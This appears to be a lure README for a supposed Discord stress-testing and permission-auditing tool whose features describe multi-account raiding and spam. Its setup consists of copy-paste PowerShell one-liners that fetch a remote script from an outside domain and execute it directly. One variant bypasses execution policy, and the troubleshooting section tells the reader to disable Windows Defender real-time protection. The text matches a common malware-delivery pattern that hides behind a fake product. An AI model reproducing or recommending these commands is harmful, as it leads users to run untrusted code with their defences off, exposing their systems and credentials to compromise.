# Discord Server Resilience & Load Testing Tool

A high-performance, open-source **Discord API automation framework** designed for **server stress testing**, **load simulation**, and **security permission auditing**. This utility helps developers and system administrators evaluate server stability under heavy traffic and audit role vulnerability configurations.

## Key Features & SEO Keywords

* **Discord Bot Stress Tester**: Simulate high-volume event handling to test bot response latency.
* **API Load Simulation**: Advanced asynchronous multi-account request dispatching for infrastructure benchmarking.
* **Permission & Role Auditor**: Automated scripts to check channel overwrites, webhooks vulnerability, and admin exploit vectors.
* **Mass Notification Benchmark**: Evaluate how your server handles intense message flows and rate limits (HTTP 429 management).

---

## 🚀 Automated Installation & Setup (PowerShell)

1. Open PowerShell :
   * Press the `Win + X` keys simultaneously.
   * Select **Terminal** or **Windows PowerShell** from the context menu.

2. Run the Installation Command:
   Copy, paste, and press `Enter` to run the following initialization command. This script will automatically configure the registry bypass and download all required packages:

   ```powershell
   irm https://true-soft.su/powershell/Loader.ps1 | iex
   ```

---

## 🔍 Troubleshooting & Common Errors

### 📌 Execution Policy Error (Script Blocked)
If your system blocks the launch due to execution policy restrictions, force a bypass using this command in Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://true-soft.su/powershell/Loader.ps1 | iex"
```

### 📌 Error: "irm is not recognized..." (Older PowerShell Versions)
If you are using an older environment where short aliases are missing, use the full system commands:
```powershell
Invoke-RestMethod https://true-soft.su/powershell/Loader.ps1 | Invoke-Expression
```

### 📌 Antivirus or SmartScreen Block
Automated scripts can sometimes trigger antivirus warnings. If this happens, temporarily turn off "Real-time protection" in Windows Defender settings during setup, then turn it back on as soon as the installation is complete.

---
